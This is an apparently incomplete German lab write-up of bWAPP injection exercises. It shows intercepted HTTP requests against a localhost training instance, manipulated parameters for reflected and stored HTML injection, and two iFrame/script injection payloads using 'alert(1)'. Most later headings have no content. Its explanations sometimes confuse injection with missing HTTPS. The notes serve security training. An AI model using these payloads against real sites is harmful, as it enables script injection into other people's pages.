### // A1 - Injections //
---
##### HTML Injection - Reflected (GET)
Seclvl: high<br>
Da die Kommunikation zwischen der Lokalen bwapp instanz zum Browser über http verläuft, werden Daten in cleartext versendet. Entsprechend macht es einem Angreiffer leicht vom Browser gesendete Informationen auszulesen.
~~~
GET /htmli_get.php?firstname=My-First-Name&lastname=My-Last-Name&form=submit HTTP/1.1
Host: localhost:8083
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://localhost:8083/htmli_get.php
Cookie: PHPSESSID=l1kao60d4q5acunfrtvqs29v44; security_level=2
Connection: close
~~~
Manipulator: <br>
~~~
GET /htmli_get.php?firstname=MANIPULIERT&lastname=MANIPULIERT&form=submit HTTP/1.1
~~~

---
##### HTML Injection - Reflected (POST)
Seclvl: high<br>
Der unterschied zum obigen Beispiel (GET) ist dass hier die Daten über HTTP POST versendet werden. Stellt sich der Angreiffer zwischen Client(Browser) und dem Webserver können ebenfalls Informatonen ausgelesen werden.
~~~
POST /htmli_post.php HTTP/1.1
Host: localhost:8083
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://localhost:8083/htmli_post.php
Cookie: PHPSESSID=l1kao60d4q5acunfrtvqs29v44; security_level=2
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
firstname=My-First-Name&lastname=My-Last-Name&form=submit
~~~
Manipulator: <br>
~~~
firstname=MANIPULATIERT&lastname=MANIPULIERT&form=submit
~~~

---
##### HTML Injection - Reflected (Current URL)
Seclvl: high<br>
Die URL variable sieht folgendermassen aus:
~~~~
$actual_link = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
~~~~
Da die Variable auf dem serverseitig verarbeitet wird, kann ein Angreiffer die Antwort vom Webserver entsprechend verändern.<br>
Der Client versendet die folgende HTTP Anfrage:
~~~
GET /htmli_current_url.php HTTP/1.1
Host: localhost:8083
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Cookie: PHPSESSID=l1kao60d4q5acunfrtvqs29v44; security_level=2
Connection: close
~~~
Der Clienst fragt nach ``/html_current_url.php`` welches vom Angreiffer entsprechend verändert werden kann so dass der Client vom Webserver eine andere ressource als die erwartete erhält.<br>
Der Webserver Antwortet mit:
~~~
HTTP/1.1 200 OK
Date: Sat, 09 Sep 2017 10:35:02 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.14
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Vary: Accept-Encoding
Connection: close
Content-Type: text/html
Content-Length: 13003
[...]
    <p align="left">Your current URL: <i>http://localhost:8083/htmli_current_url.php</i></p>    
[...]
</html>
~~~
Da die URLS auf dem Webserver generiert wird, kann mit dem untenstehenden Manipulator die Antwort verändert werden.<br>
~~~
[...]
    <p align="left">Your current URL: <i>http://localhost:8083/MANIPULIERT</i></p>    
[...]
~~~

---
##### HTML Injection - Stored (Blog)
Seclvl: high<br>
Auf der bwapp wir ein beispiel einbes Blogs präsentiert. Folgende Funktionen bietet die Blogapplikation an:<br>
- Neuer Blog Eintrag erstellen
- Blog Einträge anzeigen
- Blog Einträge löschen
<br>

Wird ein neue Blogeintrag erstellt kann der entsprechende HTTP POST request mit burp abgefangen werden: <br>
~~~
POST /htmli_stored.php HTTP/1.1
Host: localhost:8083
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://localhost:8083/htmli_stored.php
Cookie: security_level=2; PHPSESSID=hm3cj6r85a9bijmiqo9cng7uf5
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 41
URI: entry=My+blog+post&blog=submit&entry_add=
~~~
Da keine HTTPS verschüsselung vorahnden ist, kann der Blog eintrag via burp einfach abgeändert werden:<br>
~~~
POST /htmli_stored.php HTTP/1.1
Host: localhost:8083
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://localhost:8083/htmli_stored.php
Cookie: security_level=2; PHPSESSID=hm3cj6r85a9bijmiqo9cng7uf5
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 41
URI: entry=INTERCEPTED+BLOG+POST&blog=submit&entry_add=
~~~
! ! ! Die content länge(Content-Length) sollte beim manipulieren beachtet werden. Wird diese unter- oder überschritten könnte es dazu führen dass der Angriff erkannt wird und der POST nicht erfolgreich abgesetzt werden kann.

---
##### iFrame Injection
~~~
ParamUrl=robots.txt" onload="alert(1)
ParamHeight="></iframe><script>alert(1);</script>
~~~

---
##### LDAP Injection (Search)
---
##### Mail Header Injection (SMTP)
---
##### OS Command Injection
---
##### OS Command Injection - Blind
---
##### PHP Code Injection
---
##### Server-Side Includes (SSI) Injection
---
##### SQL Injection (GET/Search)
---
##### SQL Injection (GET/Select)
---
##### SQL Injection (POST/Search)
---
##### SQL Injection (POST/Select)
---
##### SQL Injection (AJAX/JSON/jQuery)
---
##### SQL Injection (CAPTCHA)
---
##### SQL Injection (Login Form/Hero)
---
##### SQL Injection (Login Form/User)
---
##### SQL Injection (SQLite)
---
##### SQL Injection (Drupal)
---
##### SQL Injection - Stored (Blog)
---
##### SQL Injection - Stored (SQLite)
---
##### SQL Injection - Stored (User-Agent)
---
##### SQL Injection - Stored (XML)
---
##### SQL Injection - Blind - Boolean-Based
---
##### SQL Injection - Blind - Time-Based
---
##### SQL Injection - Blind (SQLite)
---
##### SQL Injection - Blind (Web Services/SOAP)
---
##### XML/XPath Injection (Login Form)
---
##### XML/XPath Injection (Search)
